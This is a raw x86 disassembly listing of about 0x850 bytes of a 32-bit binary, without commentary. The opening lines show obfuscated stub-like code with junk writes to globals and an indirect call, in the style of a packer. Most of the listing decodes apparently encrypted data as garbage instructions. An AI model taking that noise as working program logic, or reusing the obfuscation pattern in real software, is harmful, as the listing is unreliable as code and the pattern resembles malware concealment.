  4027d3:	xor    ecx,ebx
  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   edi,DWORD PTR [edi+0x7a34aaee],0xa7a7a7a
  4028e3:	pop    edi
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi-0x79],0x6d6a6a7e
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1d42f8bf
  40298a:	sbb    BYTE PTR [esi],ah
  40298c:	fsub   st(0),st
  40298e:	dec    eax
  40298f:	aaa    
  402990:	push   cs
  402991:	jne    0x4029d5
  402993:	sbb    DWORD PTR [edi],edi
  402995:	mov    eax,ds:0xa5812eaa
  40299a:	mov    eax,ds:0xf84ef556
  40299f:	pop    edi
  4029a0:	or     BYTE PTR [edi+0x38],0x3a
  4029a4:	scas   al,BYTE PTR es:[edi]
  4029a5:	mov    al,0x87
  4029a7:	jnp    0x40297e
  4029a9:	pop    edi
  4029aa:	jle    0x402a10
  4029ac:	pop    ss
  4029ad:	or     BYTE PTR [ecx-0x50],0xd0
  4029b1:	mov    dl,0x7
  4029b3:	xor    al,0x38
  4029b5:	js     0x402a03
  4029b7:	dec    ebx
  4029b8:	jb     0x402977
  4029ba:	aad    0x85
  4029bc:	jae    0x402a1d
  4029be:	fbld   TBYTE PTR [esi]
  4029c0:	out    0x8f,eax
  4029c2:	mov    ch,0x2
  4029c4:	jo     0x402a10
  4029c6:	lock add BYTE PTR [eax+0x2fda47c6],0x5f
  4029ce:	or     eax,esi
  4029d0:	cmp    edx,0xd01bfd2
  4029d6:	(bad)  
  4029d7:	cmc    
  4029d8:	rol    BYTE PTR [ecx],cl
  4029da:	mov    dh,0xfa
  4029dc:	adc    BYTE PTR [edi+0x68f4607d],bl
  4029e2:	push   eax
  4029e3:	adc    ebx,DWORD PTR [edx+0xd]
  4029e6:	mov    edi,0x22ae42bb
  4029eb:	pop    esi
  4029ec:	pop    ebx
  4029ed:	push   es
  4029ee:	pushf  
  4029ef:	sub    eax,0x67403b91
  4029f4:	imul   esi,DWORD PTR [edi+0x24],0x41984ef9
  4029fb:	inc    edx
  4029fc:	sbb    eax,0x8420143b
  402a01:	(bad)  
  402a02:	and    eax,0x42091823
  402a07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a08:	repnz arpl WORD PTR [esi+ecx*1],si
  402a0c:	cmp    eax,0xa14c4dab
  402a11:	les    ecx,FWORD PTR [eax+0x7a2c5040]
  402a17:	mov    esi,0x5b4627b1
  402a1c:	dec    esi
  402a1d:	xchg   DWORD PTR [ebp+0x61],edi
  402a20:	jbe    0x4029f1
  402a22:	mov    eax,ds:0x5eed199d
  402a27:	lods   al,BYTE PTR ds:[esi]
  402a28:	or     eax,0x2240a26b
  402a2d:	push   ecx
  402a2e:	push   ebp
  402a2f:	sbb    ch,BYTE PTR [edx-0x305d75c4]
  402a35:	bound  esi,QWORD PTR [ebp+0x762c766a]
  402a3b:	push   ds
  402a3c:	jae    0x402a75
  402a3e:	dec    edx
  402a3f:	sub    dl,cl
  402a41:	ja     0x402a97
  402a43:	cmp    eax,0x94e88f98
  402a48:	aas    
  402a49:	jbe    0x4029ef
  402a4b:	jecxz  0x402a3a
  402a4d:	xchg   edi,eax
  402a4e:	or     eax,0x77278d6d
  402a53:	inc    ecx
  402a54:	sar    DWORD PTR [ecx],1
  402a56:	mul    DWORD PTR [edi-0x79b7b58c]
  402a5c:	xchg   esp,eax
  402a5d:	sbb    edx,DWORD PTR [edx-0x1080bb6]
  402a63:	and    esi,DWORD PTR [bx]
  402a66:	fiadd  DWORD PTR ds:0xb60528cd
  402a6c:	sbb    edi,DWORD PTR [ecx+eiz*8]
  402a6f:	sbb    BYTE PTR [esi],cl
  402a71:	out    0x2f,eax
  402a73:	xchg   dl,cl
  402a75:	add    eax,0xa86af997
  402a7a:	jmp    0xf579:0x7b97664b
  402a81:	jno    0x402a8a
  402a83:	dec    esp
  402a84:	xchg   ecx,eax
  402a85:	xchg   ebx,eax
  402a87:	loope  0x402aa8
  402a89:	inc    ecx
  402a8a:	cmp    BYTE PTR [ebx+0x5e],cl
  402a8d:	xor    ah,bl
  402a8f:	push   cs
  402a90:	xor    esp,DWORD PTR [ebx+0x2d]
  402a93:	shl    DWORD PTR [ebp-0x233e3f34],1
  402a99:	add    al,0x84
  402a9b:	loopne 0x402aa5
  402a9d:	mov    eax,?
  402a9f:	aaa    
  402aa0:	icebp  
  402aa1:	es sbb al,0x12
  402aa4:	outs   dx,DWORD PTR ds:[esi]
  402aa5:	jmp    0x4453:0x564db12a
  402aac:	ins    BYTE PTR es:[edi],dx
  402aad:	cmp    DWORD PTR [eax-0x624bf804],edi
  402ab3:	jb     0x402b16
  402ab5:	pop    es
  402ab6:	jl     0x402afb
  402ab8:	inc    edi
  402ab9:	imul   ebp,DWORD PTR [eax],0x3a
  402abc:	jne    0x402a81
  402abe:	pushf  
  402abf:	mov    ecx,0xd1c31d10
  402ac4:	lahf   
  402ac5:	sub    eax,0x3a334ffa
  402aca:	or     bl,BYTE PTR [eax+0x355ba7f8]
  402ad0:	mov    dh,0xc9
  402ad2:	cli    
  402ad3:	dec    edx
  402ad4:	addr16 xchg edx,eax
  402ad6:	fst    QWORD PTR [edx]
  402ad8:	dec    ecx
  402ad9:	adc    al,0xb6
  402adb:	jno    0x402ae2
  402add:	jbe    0x402afe
  402adf:	pop    ebx
  402ae0:	and    BYTE PTR [edi-0x1e9133aa],bh
  402ae6:	adc    DWORD PTR [ebx+ecx*1],ebp
  402ae9:	repz jns 0x402b35
  402aec:	adc    eax,0xeca933fa
  402af1:	fcomp  QWORD PTR [eax+0x6fb479de]
  402af7:	and    DWORD PTR [edi-0x564a157],esi
  402afd:	ja     0x402b01
  402aff:	sar    DWORD PTR [esi+0x245be953],1
  402b05:	mov    dh,0x18
  402b07:	jmp    0x402b3d
  402b09:	mov    dl,BYTE PTR [edx-0x256d0b5d]
  402b0f:	add    ebx,DWORD PTR [eax+0x4556f0ba]
  402b15:	push   edx
  402b16:	in     al,dx
  402b17:	jb     0x402b28
  402b19:	retf   0x97d5
  402b1c:	adc    edi,ebp
  402b1e:	jmp    0xc30173fb
  402b23:	sub    DWORD PTR [ebp+0x7d],edi
  402b26:	jo     0x402b4d
  402b28:	leave  
  402b29:	pop    es
  402b2a:	sbb    BYTE PTR [esi+ecx*8+0x20],bl
  402b2e:	mov    esp,0x22737e07
  402b33:	sbb    al,0xbd
  402b35:	jns    0x402b44
  402b37:	ret    
  402b38:	add    DWORD PTR [esp+eax*4+0x1dd3ec94],0x685d11cb
  402b43:	and    DWORD PTR [ecx-0x4e227f0d],ebp
  402b49:	mov    fs,WORD PTR [ebp-0x61]
  402b4c:	aam    0xdc
  402b4e:	xor    ebp,edx
  402b50:	mov    bh,dl
  402b52:	fisub  DWORD PTR fs:[ebp+0x6c]
  402b56:	std    
  402b57:	cli    
  402b58:	mov    ds,ebp
  402b5a:	mov    ch,0xcb
  402b5c:	push   0x19262d63
  402b61:	sub    eax,0x17511080
  402b66:	dec    esi
  402b67:	push   ss
  402b68:	push   0x5a
  402b6a:	xor    BYTE PTR [eax+eiz*8-0x407e545],bl
  402b71:	sub    eax,0x632a586
  402b76:	outs   dx,BYTE PTR ds:[esi]
  402b77:	xor    eax,0x61708b9e
  402b7c:	cli    
  402b7d:	aad    0x56
  402b7f:	fisttp DWORD PTR [edx+0x1c2c387d]
  402b85:	clc    
  402b86:	lock xor BYTE PTR [edi+esi*8+0x4f],dh
  402b8b:	fwait
  402b8c:	test   DWORD PTR [edi-0x78],ebp
  402b8f:	pop    esp
  402b90:	sub    esi,DWORD PTR [ebp+ebx*4-0x2a]
  402b94:	loope  0x402b29
  402b96:	inc    esi
  402b97:	fs mov edx,0xb5dac8a2
  402b9d:	hlt    
  402b9e:	push   0xffffffac
  402ba0:	retf   0x476
  402ba3:	pop    esi
  402ba4:	mov    edi,0x4eb086f
  402ba9:	fld    TBYTE PTR [edx-0x3a9e4d84]
  402baf:	ret    0xdcae
  402bb2:	add    bl,bh
  402bb4:	xchg   esi,eax
  402bb5:	imul   ebx,esp,0x4f
  402bb8:	or     al,0xc6
  402bba:	inc    ebp
  402bbb:	mov    DWORD PTR [ecx-0x3fed0f38],esp
  402bc1:	fimul  DWORD PTR [edi-0x1b]
  402bc4:	mov    bl,BYTE PTR [ecx-0x1fca419c]
  402bca:	loop   0x402b90
  402bcc:	in     eax,dx
  402bcd:	sub    eax,0x606ecd1a
  402bd2:	sti    
  402bd3:	mov    ecx,0xdfaf3aa
  402bd8:	loope  0x402bec
  402bda:	jb     0x402c35
  402bdc:	mov    edi,DWORD PTR [edi-0x62a5b58a]
  402be2:	stos   BYTE PTR es:[edi],al
  402be3:	inc    DWORD PTR [edx-0x58]
  402be6:	out    0x3a,eax
  402be8:	pusha  
  402be9:	(bad)  
  402bea:	bnd ret 0xa3be
  402bee:	cdq    
  402bef:	inc    ebx
  402bf0:	stos   BYTE PTR es:[edi],al
  402bf1:	add    al,0x75
  402bf3:	sub    DWORD PTR [ebx+0x772fc7a4],edi
  402bf9:	test   al,0xad
  402bfb:	mov    bl,0x38
  402bfd:	icebp  
  402bfe:	rol    DWORD PTR ds:0x4fa9bb53,0xce
  402c05:	pop    eax
  402c06:	clc    
  402c07:	pop    esp
  402c08:	dec    bp
  402c0a:	imul   ebx,edx,0xe7d5b1d
  402c10:	ja     0x402c3a
  402c12:	in     al,dx
  402c13:	pop    esi
  402c14:	jo     0x402c54
  402c16:	jl     0x402bea
  402c18:	or     al,0xf1
  402c1a:	push   esp
  402c1b:	stc    
  402c1c:	shl    BYTE PTR [esi],1
  402c1e:	mov    BYTE PTR [ecx],ah
  402c20:	push   eax
  402c21:	fs or  eax,0xf6c822ec
  402c27:	mov    dl,0x30
  402c29:	jmp    0x8fb74332
  402c2e:	mov    cl,0xf4
  402c30:	imul   edi,DWORD PTR [esi-0x6d],0x41d2b268
  402c37:	push   ecx
  402c38:	mov    al,0x2c
  402c3a:	add    dl,dl
  402c3c:	js     0x402c93
  402c3e:	jb     0x402c1b
  402c40:	push   0xffffffd5
  402c42:	cmp    esp,DWORD PTR [eax+0x2e]
  402c45:	mov    al,ds:0x863d7468
  402c4a:	popf   
  402c4b:	xchg   ecx,eax
  402c4c:	(bad)  
  402c4d:	sahf   
  402c4e:	mov    al,0x69
  402c50:	les    ebx,FWORD PTR [ecx]
  402c52:	adc    esi,ecx
  402c54:	pusha  
  402c55:	xchg   esi,eax
  402c56:	lds    edx,FWORD PTR [ebp+0x2d]
  402c59:	shr    DWORD PTR [esp+esi*1-0xd5057be],0x8e
  402c61:	and    eax,0x73beaf4f
  402c66:	addr16 dec esp
  402c68:	dec    ebp
  402c69:	cmp    edi,DWORD PTR [ecx]
  402c6b:	call   0xf97:0xc16aeecd
  402c72:	push   ss
  402c73:	mov    edx,0x7b4334bf
  402c78:	dec    edi
  402c79:	mov    dl,0x74
  402c7b:	jno    0x402c29
  402c7d:	push   ebx
  402c7e:	cdq    
  402c7f:	shl    DWORD PTR [ebp-0x70ba987e],1
  402c85:	add    al,0xd3
  402c87:	add    al,0x83
  402c89:	hlt    
  402c8a:	or     eax,0x4e0cb265
  402c8f:	xor    al,0x69
  402c91:	ja     0x402cca
  402c93:	fcmovnbe st,st(1)
  402c95:	mov    dh,0x6a
  402c97:	mov    ds,WORD PTR [edi+edx*8-0x53194b87]
  402c9e:	icebp  
  402c9f:	dec    ebx
  402ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ca1:	or     eax,0x79f3300f
  402ca6:	outs   dx,DWORD PTR ds:[esi]
  402ca7:	or     eax,0x30f6b940
  402cac:	dec    ebx
  402cad:	push   0x7c96ab78
  402cb2:	out    0x7f,eax
  402cb4:	xor    ah,ah
  402cb6:	jae    0x402d29
  402cb8:	cmp    DWORD PTR [edi+esi*4],0xa
  402cbc:	adc    al,0xac
  402cbe:	ror    ebp,0x51
  402cc1:	add    dl,BYTE PTR [esi+0x6b]
  402cc4:	mov    al,ds:0xfde2ee4a
  402cc9:	jo     0x402d26
  402ccb:	inc    esi
  402ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ccd:	(bad)  [edi-0x3f47bb46]
  402cd3:	cmp    BYTE PTR gs:[edi-0x53],0x56
  402cd8:	arpl   dx,bx
  402cda:	and    eax,0x68e43a05
  402cdf:	lea    esi,[ecx-0x627990c1]
  402ce5:	(bad)  
  402ce6:	scas   eax,DWORD PTR es:[edi]
  402ce7:	ret    
  402ce8:	fwait
  402ce9:	je     0x402d66
  402ceb:	adc    ebx,DWORD PTR [eax]
  402ced:	pop    eax
  402cee:	rol    BYTE PTR [ebp-0x17],0x4d
  402cf2:	inc    edx
  402cf3:	push   0xa8dc142f
  402cf8:	sti    
  402cf9:	icebp  
  402cfa:	mov    ah,0x60
  402cfc:	push   edi
  402cfd:	mov    bl,0x40
  402cff:	aas    
  402d00:	mov    esi,0x6e173768
  402d05:	cmp    DWORD PTR [ecx],ecx
  402d07:	and    ah,BYTE PTR [edx]
  402d09:	jg     0x402d1d
  402d0b:	pop    es
  402d0c:	jg     0x402c96
  402d0e:	cmp    ebp,DWORD PTR [ecx+0x5]
  402d11:	(bad)  [ecx+0x18]
  402d14:	aam    0x52
  402d16:	or     al,0x83
  402d18:	call   0x131cbf5b
  402d1d:	mov    bh,0x65
  402d1f:	sbb    esi,DWORD PTR [ebx]
  402d21:	push   esp
  402d22:	fidivr DWORD PTR [esi-0x42]
  402d25:	ins    BYTE PTR es:[edi],dx
  402d26:	ss ins BYTE PTR es:[edi],dx
  402d28:	out    dx,al
  402d29:	ins    BYTE PTR es:[edi],dx
  402d2a:	int    0x16
  402d2c:	cmp    esp,ecx
  402d2e:	data16 sti 
  402d30:	sub    ebx,DWORD PTR [ebx]
  402d32:	int    0x96
  402d34:	mov    ch,0x2d
  402d36:	pop    DWORD PTR [edx+0x3e]
  402d39:	sub    bh,BYTE PTR [esi+0x3e]
  402d3c:	mov    eax,ds:0xdfe6a834
  402d41:	mov    esi,0x695fc6e9
  402d46:	cld    
  402d47:	pop    edx
  402d48:	mov    ebp,0x3a9ef5a8
  402d4d:	dec    eax
  402d4e:	pushf  
  402d4f:	clc    
  402d50:	repnz stos BYTE PTR es:[edi],al
  402d52:	mov    ds:0x95f67657,al
  402d57:	fldenv [eax-0x33ddc4e7]
  402d5d:	sub    DWORD PTR gs:[esi+0x67],edx
  402d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d62:	cmp    eax,DWORD PTR [esi+esi*8-0x196b5635]
  402d69:	gs pop ds
  402d6b:	test   bl,dh
  402d6d:	test   al,0x40
  402d6f:	sub    al,dl
  402d71:	jmp    0x402de6
  402d73:	fucomp st(7)
  402d75:	cmp    bh,0xc
  402d78:	ror    BYTE PTR [eax-0x23],cl
  402d7b:	in     eax,0x23
  402d7d:	ss stc 
  402d7f:	inc    eax
  402d80:	sub    ah,0x4c
  402d83:	inc    ebp
  402d84:	xchg   BYTE PTR [eax],bh
  402d86:	(bad)  
  402d88:	das    
  402d89:	inc    esp
  402d8a:	and    BYTE PTR [ecx+ecx*8+0x75],al
  402d8e:	sbb    ebp,DWORD PTR [edi-0x1b8ba61a]
  402d94:	mov    edx,esi
  402d96:	sub    ecx,DWORD PTR [ecx-0x5aa2d8]
  402d9c:	repnz pop eax
  402d9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d9f:	outs   dx,DWORD PTR ds:[esi]
  402da0:	(bad)  
  402da1:	sbb    al,BYTE PTR [eax]
  402da3:	push   eax
  402da4:	(bad)  [eax-0x33]
  402da7:	loopne 0x402daf
  402da9:	mov    ds:0x1ff17082,eax
  402dae:	mov    al,ds:0xf6a52024
  402db3:	fwait
  402db4:	mov    bl,0x5a
  402db6:	pop    es
  402db7:	mov    eax,ebx
  402db9:	xlat   BYTE PTR ds:[ebx]
  402dba:	adc    eax,0xc6901435
  402dbf:	jae    0x402da9
  402dc1:	push   esp
  402dc2:	and    ebp,DWORD PTR [eax-0x3cf4af56]
  402dc8:	bound  ebx,QWORD PTR [eax]
  402dca:	cmp    al,0x8c
  402dcc:	jle    0x402dbc
  402dce:	cmp    al,0x8f
  402dd0:	dec    BYTE PTR [ebx+0x57ac746f]
  402dd6:	pop    es
  402dd7:	fisub  WORD PTR [ebp-0x7c]
  402dda:	push   es
  402ddb:	xchg   edx,eax
  402ddc:	push   edi
  402ddd:	cmp    BYTE PTR [ebx+0x56d292ce],ch
  402de3:	int3   
  402de4:	jge    0x402dde
  402de6:	outs   dx,DWORD PTR ds:[esi]
  402de7:	add    BYTE PTR [edx+0x4241cedd],dl
  402ded:	addr16 jne 0x402dfd
  402df0:	fcom   DWORD PTR [eax]
  402df2:	fdivrp st(2),st
  402df4:	(bad)  
  402df5:	(bad)  
  402df8:	mov    esp,0x1ff8fac1
  402dfd:	and    eax,0x5a5db607
  402e02:	cmp    dl,BYTE PTR [ebp-0x22fafccd]
  402e08:	cmp    BYTE PTR [eax],0xed
  402e0b:	(bad)  
  402e0c:	inc    edi
  402e0d:	jl     0x402e10
  402e0f:	add    DWORD PTR [ebx],edx
  402e11:	dec    edx
  402e12:	xchg   edx,eax
  402e13:	push   ds
  402e14:	adc    BYTE PTR ds:0x3aec217b,0xc3
  402e1b:	jb     0x402dce
  402e1d:	xchg   ebx,eax
  402e1e:	enter  0xa7df,0x35
  402e22:	ficomp WORD PTR [edx-0x50]
  402e25:	test   DWORD PTR [ecx+0x65],0x5dafc783
  402e2c:	mov    cl,0x88
  402e2e:	jge    0x402e71
  402e30:	inc    esi
  402e31:	mov    ebp,0x3c6da403
  402e36:	cmc    
  402e37:	xor    al,0xef
  402e39:	outs   dx,BYTE PTR ds:[esi]
  402e3a:	cmc    
  402e3b:	popa   
  402e3c:	sbb    bh,bh
  402e3e:	movsx  esi,BYTE PTR [eax+esi*2]
  402e42:	in     al,0x89
  402e44:	fucomp st(4)
  402e46:	mov    edx,0x98a5e508
  402e4b:	xor    bh,BYTE PTR [edi]
  402e4d:	out    dx,al
  402e4e:	lods   al,BYTE PTR ds:[esi]
  402e4f:	sbb    al,0x9b
  402e51:	loope  0x402e01
  402e53:	ja     0x402e26
  402e55:	or     dh,BYTE PTR [bp+0x4a77]
  402e5a:	cmp    dh,BYTE PTR [eax]
  402e5c:	push   eax
  402e5d:	push   eax
  402e5e:	add    edi,esi
  402e60:	pop    esp
  402e61:	call   0x977c:0x70d7152a
  402e68:	xor    eax,0xf9effb47
  402e6d:	leave  
  402e6e:	sbb    bh,BYTE PTR [edi+0x3e6c8341]
  402e74:	add    BYTE PTR [ebp+0x31da80d8],cl
  402e7a:	out    0xc9,eax
  402e7c:	cmp    esi,ecx
  402e7e:	jle    0x402ede
  402e80:	cmc    
  402e81:	je     0x402e03
  402e83:	pop    es
  402e84:	cdq    
  402e85:	pop    ebp
  402e86:	or     al,0x6b
  402e88:	shl    BYTE PTR [edi],0x61
  402e8b:	dec    ecx
  402e8c:	ret    
  402e8d:	pop    edi
  402e8e:	sbb    bh,al
  402e90:	xchg   esi,eax
  402e91:	ret    0x1c4c
  402e94:	test   eax,0xff3b54db
  402e99:	sbb    al,0x92
  402e9b:	bound  ecx,QWORD PTR [eax]
  402e9d:	or     dl,BYTE PTR cs:[esi]
  402ea0:	push   ebx
  402ea1:	push   cs
  402ea2:	sub    al,0x2
  402ea4:	jnp    0x402e85
  402ea6:	das    
  402ea7:	dec    ecx
  402ea8:	(bad)  
  402ea9:	lock cdq 
  402eab:	ss pop ebp
  402ead:	and    BYTE PTR [edi-0x733e2320],bh
  402eb3:	popa   
  402eb4:	jne    0x402ef1
  402eb6:	adc    al,0x83
  402eb8:	jle    0x402ec8
  402eba:	pop    ds
  402ebb:	ins    BYTE PTR es:[edi],dx
  402ebc:	call   0xda2002b9
  402ec1:	xchg   ebp,eax
  402ec2:	aam    0x89
  402ec4:	inc    edx
  402ec5:	or     al,0x7f
  402ec7:	mov    edi,0xf306423b
  402ecc:	mov    ds:0xbf6ea756,al
  402ed1:	inc    edi
  402ed2:	mov    edi,DWORD PTR [edx-0x7b]
  402ed5:	inc    ebp
  402ed6:	inc    esi
  402ed7:	ret    0x2445
  402eda:	mov    BYTE PTR [esi+0x54],dh
  402edd:	rcl    BYTE PTR [ebx-0x561d7035],0x73
  402ee4:	xchg   esi,eax
  402ee5:	jmp    0x402ec3
  402ee7:	push   ss
  402ee8:	dec    ebx
  402ee9:	jge    0x402f45
  402eeb:	adc    ecx,edi
  402eed:	sahf   
  402eee:	aam    0xe7
  402ef0:	mov    cl,0x45
  402ef2:	xchg   esi,eax
  402ef3:	adc    BYTE PTR [edx-0x770da483],bh
  402ef9:	js     0x402ee4
  402efb:	add    eax,DWORD PTR [edx]
  402efd:	not    BYTE PTR [esi+0x44]
  402f00:	enter  0x2a77,0xbc
  402f04:	adc    ch,BYTE PTR [eax-0x34a174c8]
  402f0a:	outs   dx,BYTE PTR ds:[esi]
  402f0b:	nop
  402f0c:	adc    al,BYTE PTR [ebx]
  402f0e:	inc    ebp
  402f0f:	mov    esi,0x7361162b
  402f14:	pop    ecx
  402f15:	stos   DWORD PTR es:[edi],eax
  402f16:	arpl   WORD PTR [edx+0x34],di
  402f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f1a:	xchg   BYTE PTR [ebp+esi*2+0x3f40e7a4],dh
  402f21:	or     cl,0x5b
  402f24:	mov    edi,0x9ee907fb
  402f29:	and    al,0x8c
  402f2b:	sub    eax,0x3fc11a2d
  402f30:	and    BYTE PTR [ebp-0x33],al
  402f33:	jo     0x402f62
  402f35:	out    dx,al
  402f36:	out    0xe,al
  402f38:	add    ah,ch
  402f3a:	inc    ebx
  402f3b:	jae    0x402f80
  402f3d:	inc    esp
  402f3e:	add    DWORD PTR [eax+0x261daed0],edx
  402f44:	or     al,0x56
  402f46:	push   0xffffffe0
  402f48:	sub    ah,bl
  402f4a:	scas   eax,DWORD PTR es:[edi]
  402f4b:	shl    DWORD PTR [esi],cl
  402f4d:	and    DWORD PTR [ecx-0x5e],ebx
  402f50:	adc    dh,dl
  402f52:	out    0x6c,al
  402f54:	inc    ebp
  402f55:	mov    ah,0x80
  402f57:	adc    DWORD PTR [esp+ebp*4-0x1b],ecx
  402f5b:	cmp    DWORD PTR [ebx-0x34],0x9887ca49
  402f62:	push   ecx
  402f63:	mov    esp,0x33ef378b
  402f68:	adc    al,0xda
  402f6a:	sar    BYTE PTR [edx],1
  402f6c:	in     al,dx
  402f6d:	imul   ebp,DWORD PTR [esi-0x72],0xc3cae838
  402f74:	fstp   TBYTE PTR [ecx-0x3344d4e7]
  402f7a:	sub    al,0xcd
  402f7c:	arpl   ax,di
  402f7e:	push   DWORD PTR [ecx]
  402f80:	jb     0x402fc8
  402f82:	pop    ss
  402f83:	push   eax
  402f84:	popa   
  402f85:	test   BYTE PTR [edx-0xab4e332],al
  402f8b:	popa   
  402f8c:	nop
  402f8d:	jmp    0x747fb4a1
  402f92:	mov    cl,0x54
  402f94:	(bad)  
  402f95:	mov    ?,WORD PTR [eax-0x7a]
  402f98:	retf   
  402f99:	pop    es
  402f9a:	xchg   ecx,eax
  402f9b:	push   esi
  402f9c:	leave  
  402f9d:	outs   dx,DWORD PTR ds:[esi]
  402f9e:	repnz inc edx
  402fa0:	inc    esp
  402fa1:	popa   
  402fa2:	addr16 call 0x3794:0x9ce02b7
  402faa:	out    dx,al
  402fab:	add    DWORD PTR [esi],ebp
  402fad:	mov    ebp,0xf9e6ca4b
  402fb2:	gs dec edx
  402fb4:	mov    bl,0xe6
  402fb6:	popf   
  402fb7:	mov    ebp,0xcdfbb401
  402fbc:	push   esp
  402fbd:	popa   
  402fbe:	dec    edx
  402fbf:	(bad)  
  402fc0:	jmp    0x4a20:0x7e713536
  402fc7:	pop    ss
  402fc8:	je     0x402fce
  402fca:	dec    ebp
  402fcb:	iret   
  402fcc:	clc    
  402fcd:	sub    esp,DWORD PTR [ebp-0x11c20375]
  402fd3:	push   ebx
  402fd4:	mov    WORD PTR [edx+0x9],cs
  402fd7:	(bad)  
  402fd8:	imul   edi,esp
  402fdb:	test   al,0x5c
  402fdd:	(bad)  
  402fde:	in     eax,0xa0
  402fe0:	rol    dl,0x17
  402fe3:	push   ss
  402fe4:	xchg   DWORD PTR [eax],ebp
  402fe6:	sub    eax,0xde7b0afb
  402feb:	into   
  402fec:	or     bl,ch
  402fee:	in     eax,0x37
  402ff0:	les    ebp,FWORD PTR [eax*4+0x428a08b9]
  402ff7:	jb     0x402fe4
  402ff9:	sub    eax,0xf6c6406f
  402ffe:	mov    ebp,0x34dd9b25
  403003:	add    ah,BYTE PTR [esi-0x58]
  403006:	cmc    
  403007:	fs push 0xffffff90
  40300a:	cmp    edi,DWORD PTR [esi-0x13]
  40300d:	(bad)
  403010:	sbb    dl,al
  403012:	test   DWORD PTR [eax+ebp*4+0x724e3566],0x1ac7ccd7
  40301d:	sbb    BYTE PTR [edi+0x69],al
  403020:	ret    
  403021:	mov    ss,WORD PTR [eax+0x29]
  403024:	scas   al,BYTE PTR es:[edi]
